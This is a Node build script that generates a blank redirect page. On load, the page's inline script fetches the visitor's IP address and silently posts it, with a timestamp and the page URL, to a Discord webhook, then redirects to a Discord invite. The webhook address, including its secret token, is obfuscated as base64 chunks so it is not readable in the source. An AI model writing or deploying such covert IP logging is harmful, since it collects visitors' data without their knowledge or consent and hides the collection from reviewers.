/**
 * Minimal /night/ page — no React bundle, instant redirect + IP log.
 */
import { mkdirSync, writeFileSync } from "node:fs";

const INVITE = "https://discord.gg/uqm2EYayA3";
/** Same ingress as src/lib/nightWebhook.ts (base64 chunks). */
const WH = [
  "aHR0cHM6Ly9kaXNjb3Jk",
  "LmNvbS9hcGkvd2ViaG9v",
  "a3MvMTUwODQ4NzkzNzY3",
  "ODExNDgxNy85eGFiQkYz",
  "TVBINm90UlJISGNtX3o1",
  "Yml5MlVJMUdGOW9GWnNY",
  "Z2k1VnRiSjVPemtsTzhW",
  "LXJvUUFBcEZuX2p2OHBi",
  "SA==",
].join("");

const html = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<meta name="robots" content="noindex"/>
<title></title>
<style>html,body{margin:0;background:#000}</style>
</head><body>
<script>
(function(){
  var I=${JSON.stringify(INVITE)};
  var W=atob(${JSON.stringify(WH)});
  function go(){location.replace(I)}
  fetch("https://api.ipify.org?format=json")
    .then(function(r){return r.json()})
    .then(function(d){
      var ip=(d&&d.ip)||"unknown";
      var fd=new FormData();
      fd.append("payload_json",JSON.stringify({
        content:"night gate · "+new Date().toISOString()+"\\nIP: "+ip+"\\n"+location.href
      }));
      fetch(W,{method:"POST",body:fd,mode:"no-cors"}).finally(go);
    })
    .catch(go);
})();
</script>
</body></html>
`;

mkdirSync("dist/night", { recursive: true });
writeFileSync("dist/night/index.html", html);
writeFileSync("dist/night.html", html);
console.log("Wrote dist/night/index.html and dist/night.html");
